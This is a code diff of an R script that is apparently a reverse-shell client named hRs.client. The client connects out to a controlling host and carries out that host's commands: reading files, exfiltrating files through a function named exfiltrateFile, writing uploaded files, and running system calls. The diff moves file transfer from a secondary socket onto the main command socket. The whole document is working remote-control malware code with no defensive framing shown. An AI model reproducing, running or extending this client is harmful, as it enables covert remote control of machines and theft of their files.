@@ -86,8 +86,7 @@ catTextFile <- function(rawCommand, command) {
 
 #"download [filename]"
 #WARNING: this function reads and writes to the main socket
-#WARNING: this function attempts to open a new socket on secondaryPort
-exfiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
+exfiltrateFile <- function(socket, host, rawCommand) {
   toServer <- ""
   fileName <- substring(rawCommand, 10)
   abortDownload <- FALSE
@@ -119,18 +118,15 @@ exfiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
   }, finally={
     safeClose(targetFile)
   })
-  exfilSocket <- NULL
   if (!abortDownload) {
     writeLines(toString(fileSize), socket)
     toServer <- tryCatch({
-      exfilSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=FALSE, timeout=300, open="wb")
-      writeBin(fileData, exfilSocket, size=1)
+      writeBin(fileData, socket, size=1)
       "Download Complete!"
     }, error=function(e){
       paste("Client error transmitting file: ", e$message)
     }, warning=genericWarningMessage,
     finally={
-      safeClose(exfilSocket)
     })
   } else { #Error message
     toServer <- fileData
@@ -140,19 +136,17 @@ exfiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
 
 #"Upload [filename]"
 #WARNING: this function reads and writes to the main socket
-#WARNING: this function attempts to open a new socket on secondaryPort
-infiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
+infiltrateFile <- function(socket, host, rawCommand) {
   toServer <- ""
   abortUpload <- FALSE
   fileSize <- as.integer(readLines(socket, 1))
   fileName <- substring(rawCommand, 8)
-  uploadSocket <- NULL
+#  uploadSocket <- NULL
   fileData <- tryCatch({
     if (fileSize < 0) {
       signalCondition(simpleError("Upload Aborted"))
     }
-    uploadSocket <- socketConnection(host=host, port=secondaryPort, blocking=TRUE, server=FALSE, timeout=300, open="rb")
-    readBin(uploadSocket, "raw", n=fileSize)
+    readBin(socket, "raw", n=fileSize)
   }, error=function(e){
     abortUpload <<- TRUE
     paste("Error receiving data: ", e$message)
@@ -160,7 +154,6 @@ infiltrateFile <- function(socket, host, secondaryPort, rawCommand) {
     abortUpload <<- TRUE
     paste("Warning: ", w$message)
   }, finally={
-    safeClose(uploadSocket)
   })
   if(!abortUpload) {
     outFile <- NULL
@@ -190,8 +183,8 @@ makeSystemCall <- function(rawCommand, command) {
 }
 
 
-hRs.client <- function(host="localhost", port=4471, secondaryPort=5472) {
-  socket <- socketConnection(host=host, port=port, server=FALSE, blocking=TRUE, encoding="utf-8", timeout=86400, open="r+")
+hRs.client <- function(host="localhost", port=4471) {
+  socket <- socketConnection(host=host, port=port, server=FALSE, blocking=TRUE, timeout=86400, open="r+b")
 
   #Ensures that the socket gets closed silently, even if program fails
   on.exit(tryCatch(close(socket), error=function(e){}, warning=function(w){}))
@@ -227,11 +220,11 @@ hRs.client <- function(host="localhost", port=4471, secondaryPort=5472) {
         toServer <- catTextFile(rawCommand, command)
       }
       else if (command[1] == "download") {
-        toServer <- exfiltrateFile(socket, host, secondaryPort, rawCommand)
+        toServer <- exfiltrateFile(socket, host, rawCommand)
 
       }
       else if (command[1] == "upload") {
-        toServer <- infiltrateFile(socket, host, secondaryPort, rawCommand)
+        toServer <- infiltrateFile(socket, host, rawCommand)
       }
       else if (command[1] == "sys") {
         toServer <- makeSystemCall(rawCommand, command)
